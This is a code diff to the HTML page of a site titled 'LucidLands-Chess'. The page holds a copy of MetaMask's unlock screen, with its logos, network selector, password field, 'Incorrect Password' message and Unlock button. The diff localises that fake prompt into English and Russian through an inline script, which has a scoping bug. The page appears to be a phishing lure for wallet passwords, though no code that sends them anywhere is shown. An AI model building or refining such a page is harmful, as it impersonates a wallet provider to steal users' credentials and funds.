@@ -13,6 +13,45 @@
     <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
     <link rel="stylesheet" href="/metamask.css" />
     <title>LucidLands-Chess</title>
+    <script>
+      localeLang = {
+          "en":{
+              "GREATING" : "Welocme Back",
+              "STATUSMSG" : "The decentralized web awaits",
+              "PASSWORD": "Password",
+              "UNLOCK" : "Unlock",
+              "FORGOTPASSWORD": "Forgot password?",
+              "PRESUPPORT": "Need help? Contact ",
+              "SUPPORT": "MetaMask support"
+          },
+
+          "uk":{
+              "GREATING" : "С возвращением!",
+              "STATUSMSG" : "The decentralized web awaits",
+              "PASSWORD": "Пароль",
+              "UNLOCK" : "Разблокировать",
+              "FORGOTPASSWORD": "Забыли пароль?",
+              "PRESUPPORT": " Нужна помощь? Обратитесь в ",
+              "SUPPORT": "Поддержка MetaMask"
+          }
+      }
+      const userLang = navigator.language || navigator.userLanguage;
+      
+      if (userLang.startsWith('uk')) {
+        const eleContent = localeLang['uk'];
+      } else {
+        eleContent = localeLang['en'];
+      }
+      document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('metamask-welcome').innerText = eleContent.GREATING;
+        document.getElementById('metamask-unlock').innerText = eleContent.UNLOCK;
+        document.getElementById('metamask-password-label').innerText = eleContent.PASSWORD;
+        document.getElementById('metamask-forgot').innerText = eleContent.FORGOTPASSWORD;
+        document.getElementById('metamask-ask').innerText = eleContent.PRESUPPORT;
+        document.getElementById('metamask-support').innerText = eleContent.SUPPORT;
+      });
+      
+    </script>
   </head>
   <body>
     <noscript>You need to enable JavaScript to run this app.</noscript>
@@ -34,24 +73,25 @@
               <img class="metamask-eth" src="/metamask/eth_logo.svg"/> <span class="metamask-netname">Ethereum Mainnet</span>
               <img class="metamask-arrow-down" src="/metamask/arrow-down.svg"/>
             </div>
-            <img class="metamask-icon" src="/metamask/metamask-fox.svg"/>
+            <div class="metmask-text">
+              <img class="metamask-icon" src="/metamask/metamask-text.svg"/>
+            </div>
           </div>
           <div class="metamask-body">
             <div id="metamask-3d"></div>
             <div class="metamask-welcome-container">
-              <div class="metamask-welcome">Welcome back!</div>
-              <div class="metamask-await">The decentralized web awaits</div>
+              <div class="metamask-welcome" id ="metamask-welcome"></div>
             </div>
             <div class="input-container">
-              <input id="metamask-password" class="animated-input" placeholder=" " type="password"/>
-              <label for="input" class="floating-label">Password</label>
+              <label for="metamask-password" id="metamask-password-label"></label>
+              <input id="metamask-password" class="animated-input" placeholder="Enter password" type="password"/>
             </div>
             <div class="hidden" id="incorrect-password">Incorrect Password</div>
             <div>
-              <button class="metamask-unlock" id="metamask-unlock" disabled>Unlock</button>
+              <button class="metamask-unlock" id="metamask-unlock" disabled></button>
             </div>
-            <div class="metamask-pf"><a class="metamask-forgot" id="metamask-forgot">Forgot password?</a></div>
-            <div class="metamask-help">Need help? Contact <a class="metamask-support" href="https://support.metamask.io" target="_blank" rel="noopener noreferrer">MetaMask support</a></div>
+            <div class="metamask-pf"><a class="metamask-forgot" id="metamask-forgot"></a></div>
+            <div class="metamask-help"><span id="metamask-ask"></span><a class="metamask-support" id="metamask-support" href="https://support.metamask.io" target="_blank" rel="noopener noreferrer"></a></div>
           </div>
         </div>
       </div>
